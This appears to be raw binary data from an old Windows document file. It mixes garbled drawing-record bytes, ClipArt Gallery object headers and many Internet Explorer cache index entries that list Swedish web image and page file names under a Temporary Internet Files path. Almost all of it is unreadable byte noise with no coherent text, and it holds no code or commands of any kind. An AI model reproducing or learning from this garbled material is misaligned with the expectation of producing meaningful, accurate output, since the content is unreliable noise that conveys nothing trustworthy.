�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                                                                                               berakna_off[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      J@       @                      -ο^�\����=ϔ�z��mf �Ia�Q�                                                                           tjanste_arrow_off[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      F@                              ��T�%<U��NA.-�e�� &{b�Q�                                                                           grey[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      b@                              ����8�~��1@F�m* � S�c�Q�                                                                        
   sok[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �f@      $@                      �����G�@I�#�iR?� ��d�Q�                                                  ����         ����       �    �&   	  W   �       4��   ��   ����   z��   �          -  	   �          "    -    
������� ���,���<��Q�/�j�E���W���e���p���y���~���*�   �  ���      -    �    -    -    �           -       $����������������������������z���j���Z���K���<���.���!������	�v���g���X���.������������������� ���3���G���Z���l���������������������������������0���C���V���h���{�����������������������������������	����o��V��>��'�����������������������������r��^��I�y�4�q��l��k���m���r���z����������u��p��m��k���j���j���k���l���n���i���e���c��a��`��`��`��b��d�t�f�i�i�]�m�R�q�G�u�<�y�2�~�)��� �������������������������������������������������������������u���k���a���W���N���E���=���4���,���%�������������������������������������������
�}���n���]���L���;���(������ �~���r���h��`��[��X�w�X�]�[�I�_�4�e� �l��s���z������������������y���d���O���:���&��������v���k���a���X��P��L��K�r�O�Y�Y�F�g�8�y�.���%������������������������0���D��Z��o��������������(���7���G���W�}�h�v�z�o��j��e��b���_���^���^���^��`� �c�.�f�=�k�K�p�X�v�f�|�s������k���U���A���-������
�����������������������������������������s���h���\���R���G���=���4��-��'��"���&��/��7��@��I���L���Q���V���]��d��l��v����y���k���]���Q���E���;���1���)���$����������)��4�
�Q���b���y����������m��I��%����������������������������������������������������������������������9��^�������0���K���U���`���k���w���������������� ���$���&���'���(���'��%��"���)��4��?��I��T�
�^��i��s���~��������������������������   -    -    -    -     �  $h����q���a���R���B���3���$���������������|���m���^���M���=���+������������f��)��������{�v�F�l�4�a�"�U��H��:���+����������������������������������t���]���G���2������������������������������y���d���O���9���"������
���������������������������������~���}���p���c���V���O���I���E���B���N���Y���e���p���|��������������������������������������������������������������������������������s���b���S���E���8���/���)���#�����������!��-�*��8��G�	�W��h���z���������� ����������������������������������
��	��	���x��i��[��N�&�A�1�6�=�-�J�&�Y� �j��{�������#���3���D�u�V�j�h�_�{�V��M��G��A���=���;���:��:��<�3�@�H�F�X�L�h�S�x�[��d��n��y���������������������������	���������%��*��.��1�%�2�0�1�;�.�F�'�P��W��]�
�P��D��7��)����
����������������������������������x���e���R���A���1������1���I��`��w�(��=��S��j�������������������������������~���u���l���e���_���Y���S���M���H���C���?���7���1���.���1���5���9���?���F���M���T���[���c���i���o���u���z���~������������������������{���~���~���z���r���m���h���c���^���Y���T���O���K���G���F���I���M���S���[���c���k���s���|�������������������������o��Y�p�E�\�2�F�"�/���
�
�������������������������������v�
�i��[��O��C�(�8�2�4�7�2�<�0�B�.�H�>�I�N�K�_�M�o�O�~�R��V��Z��_��e���k���r���z���������
���������#���&���&���$��������������"���*���0���4���6���8���8���6���4��/��)�t��m��h��g���h���k���p���v���~�������������������������������������������������������������������������� ������������������ ���������������������������������������������������������������������������������������������������!���#���$���"������������������������
�>��M��]���m���~�������������������������� �����#��1��M�.�h�C��Y���o����������������1���P���o���������������������8���I���O���O�Y�N�/�Q��]���w���������������������������
�a��G��.���'���6���p���N���3������
������������'���,���0���0���,���$�|��v��t��s��r��r��r��s� �t���v���z���~����������������������������������������������������w���o���h���c���_� �\�	�Z��Y��Y�#�Z�)�[�0�^�6�a�<�e�A�j�E�p�I�v�N���K���D���8���0���'������������������������������������������p��]��I��5��"���� �����������������������������x���e���S���B���3� �'���+��B��Z��r����"���&���+���0���7���>���E���L���S���X���]���b���g���k���o���r���t���v���t���m���a���]���X���T���O���K���G���D���B���@���?���=���;���9���9���:���>���A�}�E�x�I�s�N�p�S�m�X�j�^�i�d�h�l�h�u�h�}�i��l��o��t��z����������������������w���m���c���Y���O���E���;���1���(��� ��������� �����n���X���B���+����������������������������������!��$��'��+��/��5��K��a���x�����������������������������������$���5���E���V���f���v�������������������������������������!���0���?���N���\���j���x���������������������   -    -    -    -     X   $* ��o��^��N�~�?�x�0�q�"�k��f��c���`��`��b�+�c�>�b�Q�^�b�T�p�D�|�5���%������������������������������������������������������+���7���C���O���Z���e���o���y����o�   -    -    -    �  ���      -     h   $2 ��h��o��s��u���t���q���n���i��d��`��[�+�X�7�U�C�T�P�U�\�X�h�]�s�d�~�m��v��~������������������x��l�}�]�k�O�Y�B�E�:�-�8��:��>��C���I���O���W���^���f��i��j��j��i��g��e��c��b��h�   -    �    -    -    �  ���      -       $� ���������'���6���G���Z���o�������
�������
���(�h�?�6�L�   -    �    -    -    �  ���      -     &   $ \�k�X�h�O�`�D�S�9�A�1�,�0��7���K���J���G���D���B��B�%�F�=�N�U�\�k�   -    �    -    -    �  ���      -     F   $!  �.�!�-�#�)�&�#�+��1��9��A��L���W���d���r����������������!���!�����������������|��n��`��R��D��7��+�%� �.�   -    �    -    -    �  ���      -     F   $! ��������
���#��)�+�0�:�6�J�<�[�@�m�B��A���>���7���+������������
���������������"���&���*��-�t�.�_�-�I�+�2�&������   -    �    -    -    -     �   $C ���������������������y���e���Q���B���2���"���������������������������������{���j���Z���J���G���W���h���z�������������������������������$���6���I���\���n�����������������������������	����$�"�3�/�C�:�R�D�c�L�s�T���n���j���d���[�l�O�G�?�$�)��
�o�`�c [�iR�                                                                           sinnet[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@       @                      \A��e��OEI�8A�0�
 �TgjR�                                                                           nytteller[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      (@                      �]�zH�.zˍ����vG H�jR�                                                                           freedom[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     #�@       @                      ���Oi�/��m����-�*�/ [/kR�                                                                           CoS[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �_@                              �N�y;q��´�]�"� �=�kR�                                                                           counter1[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@      @                      K\�cF����6�JLK��� � ��kR�                                                                           cross-ani[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@     @U@                      �U���
ڠG��%�
���E �VlR�                                                                           books[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ���@      J@                      Ms�㭞1�d�f>tSՕǬ� �?mR�                                                                        '   Eng_Corporate_RealNamesHomepage[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    @��@      �?                      Q^LD�z'6��L�q��� פո��                                                                           radar_work[2].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      A@                      %�]�R���Z}�	����� =mR�                                                                           home_main_anim_newline[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     H�@      ?@                      ��R�s4�^�9u�R��- �fmR�                                                                           home_sub_solutions[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @�@      5@                      �[�b��`a�#����&�>m) K+mR�                                                                           clickbox[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@      7@                      �c��:���                                                                                            home_nav_account1-over[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              qHW��L�c%>�2�Ēn���� {���                                                                           518048-beg_142[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @s@      $@                      �����e�Y 
0� փ2`�� ��:mR�                                                                        :   result;kw=Scientologkyrkan+i+Stockholm;ord=4196067[2].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     r@       @                      ��<����ٛ&�򩡲���� i�}mR�                                                                           current[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     pu@                              �� ��ǆ-C��u8�b���f i�}mR�                                                                           pubavail[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     Ш@      "@                      q���a���A�e�6�|���q� "h�mR�                                                                           head[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      �?                      ���,B�ʔ�Ȼ�~��W. ���mR�                                                                        
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������R o o t   E n t r y                                               ������������                                    ����                                                                            ������������                                                                                                                    ������������                                                                                                                    ������������                                                                                pixel[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �p@      @                      R�	d((R�A��%SC\O ���oR�                                                                           acc_random=974669325484[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �p@      @                      �Q����3'&��HuºD�� ���oR�                                                                           acc_random=974669322160[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      @                      ��z\���T:0�s��r����  �oR�                                                                           slidingstone[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@      $@                      ��Dc$bѓ`si4��M�v�L o��oR�                                                                           ehandel_92x32[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    �j�@       @                      G����
J֮؏�ԅ�JRU# RH*���                                                                           isads[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     `�@      @                      ���&y��+R�LO���\Ԍ <��oR�                                                                           acc_random=974669405453[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     +�@      1@                      0��
���o��%(�5I��ˍ ߺ�oR�                                                                           advanced_menu[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      �?                      �����C�� #��p�vU� F�fpR�                                                                           banner[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     `�@       @                      �ö��O��b(#�k���d� �
�pR�                                                                           hits[4].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     *�@      �?                      ���8�
������� ���,���<��Q�/�j�E���W���e���p���y���~���*�   �  ���      -    �    -    -    �           -       $����������������������������z���j���Z���K���<���.���!������	�v���g���X���.������������������� ���3���G���Z���l���������������������������������0���C���V���h���{�����������������������������������	����o��V��>��'�����������������������������r��^��I�y�4�q��l��k���m���r���z����������u��p��m��k���j���j���k���l���n���i���e���c��a��`��`��`��b��d�t�f�i�i�]�m�R�q�G�u�<�y�2�~�)��� �������������������������������������������������������������u���k���a���W���N���E���=���4���,���%�������������������������������������������
�}���n���]���L���;���(������ �~���r���h��`��[��X�w�X�]�[�I�_�4�e� �l��s���z������������������y���d���O���:���&��������v���k���a���X��P��L��K�r�O�Y�Y�F�g�8�y�.���%������������������������0���D��Z��o��������������(���7���G���W�}�h�v�z�o��j��e��b���_���^���^���^��`� �c�.�f�=�k�K�p�X�v�f�|�s������k���U���A���-������
�����������������������������������������s���h���\���R���G���=���4��-��'��"���&��/��7��@��I���L���Q���V���]��d��l��v����y���k���]���Q���E���;���1���)���$����������)��4�
�Q���b���y����������m��I��%����������������������������������������������������������������������9��^�������0���K���U���`���k���w���������������� ���$���&���'���(���'��%��"���)��4��?��I��T�
�^��i��s���~��������������������������   -    -    -    -     �  $h����q���a���R���B���3���$���������������|���m���^���M���=���+������������f��)��������{�v�F�l�4�a�"�U��H��:���+����������������������������������t���]���G���2������������������������������y���d���O���9���"������
���������������������������������~���}���p���c���V���O���I���E���B���N���Y���e���p���|��������������������������������������������������������������������������������s���b���S���E���8���/���)���#�����������!��-�*��8��G�	�W��h���z���������� ����������������������������������
��	��	���x��i��[��N�&�A�1�6�=�-�J�&�Y� �j��{�������#���3���D�u�V�j�h�_�{�V��M��G��A���=���;���:��:��<�3�@�H�F�X�L�h�S�x�[��d��n��y���������������������������	���������%��*��.��1�%�2�0�1�;�.�F�'�P��W��]�
�P��D��7��)����
����������������������������������x���e���R���A���1������1���I��`��w�(��=��S��j�������������������������������~���u���l���e���_���Y���S���M���H���C���?���7���1���.���1���5���9���?���F���M���T���[���c���i���o���u���z���~������������������������{���~���~���z���r���m���h���c���^���Y���T���O���K���G���F���I���M���S���[���c���k���s���|�������������������������o��Y�p�E�\�2�F�"�/���
�
�������������������������������v�
�i��[��O��C�(�8�2�4�7�2�<�0�B�.�H�>�I�N�K�_�M�o�O�~�R��V��Z��_��e���k���r���z���������
���������#���&���&���$��������������"���*���0���4���6���8���8���6���4��/��)�t��m��h��g���h���k���p���v���~�������������������������������������������������������������������������� ������������������ ���������������������������������������������������������������������������������������������������!���#���$���"������������������������
�>��M��]���m���~�������������������������� �����#��1��M�.�h�C��Y���o����������������1���P���o���������������������8���I���O���O�Y�N�/�Q��]���w���������������������������
�a��G��.���'���6���p���N���3������
������������'���,���0���0���,���$�|��v��t��s��r��r��r��s� �t���v���z���~����������������������������������������������������w���o���h���c���_� �\�	�Z��Y��Y�#�Z�)�[�0�^�6�a�<�e�A�j�E�p�I�v�N���K���D���8���0���'������������������������������������������p��]��I��5��"���� �����������������������������x���e���S���B���3� �'���+��B��Z��r����"���&���+���0���7���>���E���L���S���X���]���b���g���k���o���r���t���v���t���m���a���]���X���T���O���K���G���D���B���@���?���=���;���9���9���:���>���A�}�E�x�I�s�N�p�S�m�X�j�^�i�d�h�l�h�u�h�}�i��l��o��t��z����������������������w���m���c���Y���O���E���;���1���(��� ��������� �����n���X���B���+����������������������������������!��$��'��+��/��5��K��a���x�����������������������������������$���5���E���V���f���v�������������������������������������!���0���?���N���\���j���x���������������������   -    -    -    -     X   $* ��o��^��N�~�?�x�0�q�"�k��f��c���`��`��b�+�c�>�b�Q�^�b�T�p�D�|�5���%������������������������������������������������������+���7���C���O���Z���e���o���y����o�   -    -    -    �  ���      -     h   $2 ��h��o��s��u���t���q���n���i��d��`��[�+�X�7�U�C�T�P�U�\�X�h�]�s�d�~�m��v��~������������������x��l�}�]�k�O�Y�B�E�:�-�8��:��>��C���I���O���W���^���f��i��j��j��i��g��e��c��b��h�   -    �    -    -    �  ���      -       $� ���������'���6���G���Z���o�������
�������
���(�h�?�6�L�   -    �    -    -    �  ���      -     &   $ \�k�X�h�O�`�D�S�9�A�1�,�0��7���K���J���G���D���B��B�%�F�=�N�U�\�k�   -    �    -    -    �  ���      -     F   $!  �.�!�-�#�)�&�#�+��1��9��A��L���W���d���r����������������!���!�����������������|��n��`��R��D��7��+�%� �.�   -    �    -    -    �  ���      -     F   $! ��������
���#��)�+�0�:�6�J�<�[�@�m�B��A���>���7���+������������
���������������"���&���*��-�t�.�_�-�I�+�2�&������   -    �    -    -    -     �   $C ���������������������y���e���Q���B���2���"���������������������������������{���j���Z���J���G���W���h���z�������������������������������$���6���I���\���n�����������������������������	����$�"�3�/�C�:�R�D�c�L�s�T���n���j���d���[�l�O�G�?�$�)��
��                                                                        
 ���S�                                                                           webk[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@       @                      ^�'3�?Ȟ(�h�r��.�� M���S�                                                                           even[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      �?                      �,����F���"5컠�s% ���ӆ�                                                                        
4fN
C�W�                                                                           linje[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     J�@      �?                      ���m&i�/�z�p弰�1 c�U�\�                                                                           s_gc3[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �n@      �?                      ����Z&-�py�J�́�Y  ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q               N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     M�@      @                      ���!���D*�5j9�(k��6K ��/�T�                                                                           413808-zoomit_115[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @q@      @                      ��I-�B)?��w�
K9�3 �z?0��                                                                           ra_nextpage[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              9i�_��cY3��i�k"�^�� �b�T�                                                                           owen[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      @                      �t�ZD�S��L!ď�h��5 �ov�T�                                                                           mona[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @g@                              �dc3���7�<|�� e
�  `����                                                                        
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                        Internet Files\Content.IE5\ZAJTGOXP\+--+     L�@      @                      �Q	y���0�����Iş�j ����                                                                           annons_r10_c01[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     P�@      �?                      ����6�A��q��*d4Rw�� �
�V�                                                                           dagensfraga100x21[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      �?                      ؖ��Ň���)��A��_� MRD�[�                                                                           ikae[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@                              ���n&�6y�/a�[Ҁ�N �:�ރ�                                                                           sok_pa_ord[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\�  ���All Categories C:\Program\Microsoft Works\workscor\j0160042.wmf   � �G� \�      �   � �7�         $=w� � PO4���n ���g���  �            � x     �n č��  �       @�n & x  �            ����� x                ��n        All Categories0C:\Program\Microsoft Works\workscor\j0160042.wmf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          flygfrakt_problem[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@                              b��mb8��������l� ?��W�                                                                           Hode7[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              �Ӻ�Eb�Oѿj�WC���� ��V�W�                                                                        
��s�AR5 ��+�W�                                                                           linje_banner1[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      j@      �?                      H&+�t�, 4����ռ8� �.�W�                                                                           arets_julklappar_hx[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    �a�@      @                      �����r\w�kl�.ƫ  �gR��                                                                           ddjustnu2[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �i@      �?                      �A��D�	��~2ٚ�FۤۧW m�\�                                                                           imp[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �W@      @                      Hh4�1T��_����Y=�$iy <���                                                                           ljud12x9[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      N@                      ��#����Pn`��Lt"�M� ��u٤�                                                                           video[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@       @                      p 5�=��2;f�=�yå ���W�                                                                           netviq468_alert2[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �K@                              ���\:{W�[v�Ä��!$�( �פ�                                                                           distans[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ���@      �?                      OճG��K�hP�d�"6�i�� �!��W�                                                                        
